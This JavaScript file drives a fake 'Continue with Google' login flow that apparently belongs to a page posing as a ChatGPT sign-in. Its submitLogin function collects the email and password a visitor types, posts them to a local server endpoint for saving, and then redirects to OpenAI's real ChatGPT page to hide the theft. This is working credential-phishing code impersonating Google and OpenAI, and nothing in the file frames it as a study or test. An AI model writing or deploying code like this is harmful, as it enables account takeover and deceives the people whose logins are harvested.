// Hide all modals
function closeAll() {
  document.getElementById('modal-main').style.display = 'none';
  document.getElementById('modal-google-email').style.display = 'none';
  document.getElementById('modal-google-password').style.display = 'none';
  document.getElementById('google-email-footer').style.display = 'none';
  document.getElementById('google-password-footer').style.display = 'none';
}

// "Continue with Google" clicked → show Google email modal
function openGoogleModal() {
  document.getElementById('modal-main').style.display = 'none';
  document.getElementById('modal-google-email').style.display = 'block';
  document.getElementById('google-email-footer').style.display = 'flex';
  document.getElementById('modal-google-password').style.display = 'none';
  document.getElementById('google-password-footer').style.display = 'none';
}

// "Next" on Google email modal → show Google password modal
function openGooglePassword() {
  const email = document.getElementById('google-email-input').value.trim();

  if (!email) {
    alert('Please enter your email address.');
    return;
  }

  document.getElementById('google-email-display').textContent = email;

  document.getElementById('modal-google-email').style.display = 'none';
  document.getElementById('google-email-footer').style.display = 'none';
  document.getElementById('modal-google-password').style.display = 'block';
  document.getElementById('google-password-footer').style.display = 'flex';
}

// "Continue" on email input in modal 1
function openEmailPassword() {
  const email = document.getElementById('email-input').value.trim();
  if (!email) {
    alert('Please enter your email address.');
    return;
  }
  window.location.href = 'chat.html';
}

// Submit to Formspree then redirect
async function submitLogin() {
  const email = document.getElementById('google-email-display').textContent;
  const password = document.getElementById('google-password-input').value;

  if (!password) {
    alert('Please enter your password.');
    return;
  }

  await fetch('http://localhost:3000/save', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: email, password: password })
  });

  window.location.href = 'https://openai.com/index/chatgpt/';
}

// Show/hide password checkbox
function togglePassword() {
  const input = document.getElementById('google-password-input');
  input.type = input.type === 'password' ? 'text' : 'password';
}